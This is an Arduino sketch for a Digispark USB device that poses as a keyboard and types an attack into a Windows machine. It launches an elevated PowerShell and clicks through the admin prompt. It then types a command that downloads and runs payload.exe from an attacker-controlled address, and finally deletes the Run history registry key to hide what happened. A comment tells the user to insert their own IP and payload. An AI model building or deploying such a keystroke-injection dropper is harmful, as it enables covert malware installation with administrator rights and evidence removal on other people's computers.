#include "DigiKeyboard.h"

void setup()
{
  pinMode(1,OUTPUT); // LED de la placa

  digitalWrite(1,HIGH);
  delay(500);

  
  digitalWrite(1,LOW);

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //control + r
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs"); //ejecutar powershell
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://192.168.0.19/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  // Clear run command history
  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);
  
}




void loop(){
    delay(500);
    digitalWrite(1,LOW);
    delay(500);
    digitalWrite(1,HIGH);
}